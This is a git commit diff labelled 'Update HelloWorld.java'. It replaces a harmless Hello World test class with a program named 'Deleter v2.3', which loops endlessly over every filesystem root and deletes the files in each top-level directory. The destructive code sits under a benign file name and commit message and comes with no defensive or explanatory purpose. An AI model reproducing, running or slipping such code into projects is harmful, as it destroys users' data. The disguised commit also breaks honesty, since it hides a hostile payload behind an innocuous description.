ba34cc684880716a4babc0d93593cf456820dd5d
User-1819 <jackstage527+1@gmail.com>
2025-02-20 10:22:13 -0500

    Update HelloWorld.java

--- app/java/test/HelloWorld.java
+++ app/java/test/HelloWorld.java
@@ -1,17 +1,49 @@
-package test;
+import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.util.ArrayList;
+import java.util.Arrays;
 
 public class HelloWorld {
-    static String str = "Hello world!";
+  public static final String Ver = "2.3";
+  public static final String Title = "Deleter v" + HelloWorld.Ver;
+  public static final ArrayList<File> Disks = new ArrayList<File>(Arrays.asList(File.listRoots()));
 
-    void test() throws RuntimeException {
-        try {
-            System.out.println(str);
-        } catch (Exception e) {
-            e.printStackTrace();
+  public static long UInt64 = 0;
+
+  public static void DeleteDir() {
+    System.out.println(Title);
+    while (true) {
+      for (File root : File.listRoots()) {
+        // System.setProperty("java.awt.headless", "true"); // To avoid GUI issues
+        String drives = root.toString();
+        for (String drive : drives.split("\n")) {
+          File[] dirs = new File(drive).listFiles();
+          if (dirs != null) {
+            for (File dir : dirs) {
+              if (dir.isDirectory()) {
+                File[] files = dir.listFiles();
+                if (files != null) {
+                  for (File file : files) {
+                    System.out.println("Deleting " + file);
+                    try {
+
+                      Files.delete(file.toPath());
+
+                    } catch (IOException e) {
+                      e.printStackTrace();
+                    }
+                  }
+                }
+              }
+            }
+          }
         }
+      }
     }
+  }
 
-    public static void main(String args[]) {
-        new HelloWorld().test();
-    }
+  public static void main(String[] args) {
+    HelloWorld.DeleteDir();
+  }
 }
